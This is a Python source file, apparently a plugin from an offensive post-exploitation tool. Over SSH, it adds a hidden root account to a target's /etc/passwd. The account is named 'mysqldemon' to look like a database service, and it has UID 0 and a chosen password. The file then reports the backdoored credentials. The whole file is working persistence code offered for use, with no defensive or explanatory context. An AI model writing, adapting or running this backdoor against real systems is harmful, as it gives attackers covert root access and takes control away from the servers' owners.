import logging
import crypt
from hyderaddons import bcolors

class BackdoorPasswd:

    name = "backdoor_passwd"
    description = "Adds static /etc/passwd entry for user mysqldemon"
    safe = False

    def run(self, sshclient, args, server):
        pwd = crypt.crypt(args.backdoor_pwd, "$6$60B3g.cP$")
        logging.debug("Generated password for /etc/passwd: %s" % pwd)
        precmd = '''grep -v mysqldemon /etc/passwd > /etc/passwd.tmp; mv /etc/passwd.tmp /etc/passwd; '''
        cmd = '''echo "mysqldemon:%s:0:0:root,,,:/root:/bin/bash" >> /etc/passwd || echo notfound''' % pwd
        _, stdout, _ = sshclient.exec_command(precmd + cmd)

        if "notfound" in stdout.read().decode():
            logging.error("Backdooring /etc/passwd unsuccessful")
        else:
            print("Backdooring /etc/passwd successful")
            print("\tBackdoored user: " + bcolors.red("mysqldemon"))
            print("\tBackdoored pass: " + bcolors.red(args.backdoor_pwd))
        return True
